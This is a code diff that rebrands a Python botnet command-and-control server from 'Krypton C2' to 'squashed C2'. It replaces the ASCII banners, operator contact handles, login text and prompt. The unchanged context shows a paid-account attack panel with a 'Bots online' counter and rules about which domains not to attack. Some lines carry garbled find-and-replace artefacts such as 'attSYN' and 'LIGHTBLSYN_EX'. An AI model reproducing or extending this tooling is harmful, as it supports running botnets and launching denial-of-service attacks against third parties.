@@ -38,34 +38,35 @@ from colorama import Fore, init
 
 
 banner2 = '''
-    ██ ▄█▀ ██▀███ ▓██   ██▓ ██▓███  ▄▄▄█████▓ ▒█████   ███▄    █ 
-    ██▄█▒ ▓██ ▒ ██▒▒██  ██▒▓██░  ██▒▓  ██▒ ▓▒▒██▒  ██▒ ██ ▀█   █ 
-    ▓███▄░ ▓██ ░▄█ ▒ ▒██ ██░▓██░ ██▓▒▒ ▓██░ ▒░▒██░  ██▒▓██  ▀█ ██▒
-    ▓██ █▄ ▒██▀▀█▄   ░ ▐██▓░▒██▄█▓▒ ▒░ ▓██▓ ░ ▒██   ██░▓██▒  ▐▌██▒
-    ▒██▒ █▄░██▓ ▒██▒ ░ ██▒▓░▒██▒ ░  ░  ▒██▒ ░ ░ ████▓▒░▒██░   ▓██░
-    ▒ ▒▒ ▓▒░ ▒▓ ░▒▓░  ██▒▒▒ ▒▓▒░ ░  ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
-    ░ ░▒ ▒░  ░▒ ░ ▒░▓██ ░▒░ ░▒ ░         ░      ░ ▒ ▒░ ░ ░░   ░ ▒░
-    ░ ░░ ░   ░░   ░ ▒ ▒ ░░  ░░         ░      ░ ░ ░ ▒     ░   ░ ░ 
-    ░  ░      ░     ░ ░                           ░ ░           ░ 
-                    ░ ░                                           
+  ██████   █████   █    ██  ▄▄▄        ██████  ██░ ██ ▓█████ ▓█████▄ 
+▒██    ▒ ▒██▓  ██▒ ██  ▓██▒▒████▄    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▒██▀ ██▌
+░ ▓██▄   ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░▒███   ░██   █▌
+  ▒   ██▒░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██   ▒   ██▒░▓█ ░██ ▒▓█  ▄ ░▓█▄   ▌
+▒██████▒▒░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██████▒▒░▓█▒░██▓░▒████▒░▒████▓ 
+▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░ ▒▒▓  ▒ 
+░ ░▒  ░ ░ ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░ ░ ▒  ▒ 
+░  ░  ░     ░   ░  ░░░ ░ ░   ░   ▒   ░  ░  ░   ░  ░░ ░   ░    ░ ░  ░ 
+      ░      ░       ░           ░  ░      ░   ░  ░  ░   ░  ░   ░    
+                                                              ░                                               
                  ( Type "help" for Commands )      
-                    ( Discord: cirqueira )     
+                  ( Discord: @squishy.9876 )     
 '''
 
 banner1 = '''
-    ▄ •▄ ▄▄▄   ▄· ▄▌ ▄▄▄·▄▄▄▄▄       ▐ ▄ 
-    █▌▄▌▪▀▄ █·▐█▪██▌▐█ ▄█•██  ▪     •█▌▐█
-    ▐▀▀▄·▐▀▀▄ ▐█▌▐█▪ ██▀· ▐█.▪ ▄█▀▄ ▐█▐▐▌
-    ▐█.█▌▐█•█▌ ▐█▀·.▐█▪·• ▐█▌·▐█▌.▐▌██▐█▌
-    ·▀  ▀.▀  ▀  ▀ • .▀    ▀▀▀  ▀█▄▀▪▀▀ █▪                                         
+                                 .__               .___
+  ______________ _______    _____|  |__   ____   __| _/
+ /  ___/ ____/  |  \__  \  /  ___/  |  \_/ __ \ / __ | 
+ \___ < <_|  |  |  // __ \_\___ \|   Y  \  ___// /_/ | 
+/____  >__   |____/(____  /____  >___|  /\___  >____ | 
+     \/   |__|          \/     \/     \/     \/     \/                                         
         ( Type "help" for Commands )      
-           ( Discord: cirqueira )        
+         ( Discord: @squishy.9876 )        
 '''
 
 bannerLogin = '''
-            ( Discord: cirqueira )
-          ( Telegram: CirqueiraDev )
-        Thank you for using Krypton C2
+            ( Discord: @squishy.9876 )
+          ( Telegram: @squishy9876 )
+        Thank you for using squashed C2
 '''
 
 def text2Gen(word):
@@ -120,8 +121,8 @@ banner2 = text2Gen(banner2)
 bannerLogin = text2Gen(bannerLogin)
 
 rules = f"""
-{lightwhite}1. {gray}Do not attSYN .gov/.gob/.edu/.mil domains
-{lightwhite}2. {gray}Do not spam attSYNs
+{lightwhite}1. {gray}Do not attack .gov/.edu/.mil domains
+{lightwhite}2. {gray}Do not spam attacks
 """
 
 help = f"""
@@ -293,8 +294,8 @@ def captcha(send, client, grey):
 
 # Client handler
 def handle_client(client, address):
-    send(client, "\33]0;Krypton C2 | Login\a")
-    send(client, f'\x1bKrypton C2 | Login: Awaiting Response...\a', False)
+    send(client, "\33]0;squashed C2 | Login\a")
+    send(client, f'\x1bsquashed C2 | Login: Awaiting Response...\a', False)
     send(client, ansi_clear, False)
     send(client, f'{color("LIGHTBLSYN_EX")}Connecting...')
     captcha(send, client, color("LIGHTBLSYN_EX"))
@@ -416,7 +417,7 @@ def clear(client, command):
 def update_title(client, name, expires):
     while 1:
         try:
-            send(client, f"\33]0;Krypton C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
+            send(client, f"\33]0;squashed C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
             time.sleep(0.6)
         except:
             client.close()
@@ -426,7 +427,7 @@ def command_line(client, username):
     for x in banner2.split('\n'):
         send(client, x)
 
-    prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}Krypton{color("LIGHTBLSYN_EX")}@{color("CYAN")}{username}{color("LIGHTBLSYN_EX")}) > {color("LIGHTBLSYN_EX")}'
+    prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}squashed{color("LIGHTBLSYN_EX")}@{color("CYAN")}{username}{color("LIGHTBLSYN_EX")}) > {color("LIGHTBLSYN_EX")}'
     send(client, prompt, False)
 
     while 1:
@@ -564,7 +565,7 @@ def command_line(client, username):
 screenedSuccessfully = """
                               
     [ %sSuccessfully Screened%s ]
-            %sKrypton C2%s
+            %ssquahsed C2%s
     ───────────────────────────    
             ( %sLogs%s )
 
